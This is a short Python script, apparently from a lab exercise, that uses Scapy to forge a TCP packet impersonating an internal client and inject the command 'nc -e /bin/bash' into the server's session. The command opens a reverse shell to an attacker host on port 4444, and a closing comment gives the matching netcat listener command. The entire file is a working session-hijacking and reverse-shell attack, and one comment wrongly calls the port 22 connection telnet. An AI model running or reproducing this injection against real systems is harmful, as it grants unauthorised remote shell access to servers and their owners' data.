import sys
#importing all libraries for scapy
from scapy.all import *

print("injecting reverse shell to internal server impersonating as internal client to get server access....")

#src is Internal client IP and dst is Internal server IP
IPLayer = IP (src="10.10.10.194", dst = "10.10.10.199")

#dport is 22 because this is a telnet connection.
#flag is A because we are also acknowledging the connection as client.
# sport, seq, ack are obained from latest tcp packet captured.
TCPLayer = TCP (sport=52048, dport=22, flags="A", seq=3372055682, ack=3070297613)

#here the payload is the reverse shell script to be executed in the server impersonating as client
#ATT_IP is the attacker ip addres, because we need attacker to get server access
Payload = "\n nc -e /bin/bash 10.10.10.197 4444 /home/msfadmin/\n"

pkt=IPLayer/TCPLayer/Payload
ls(pkt)
send(pkt,verbose=0)





#run python3 attack.py & nc -lvp 4444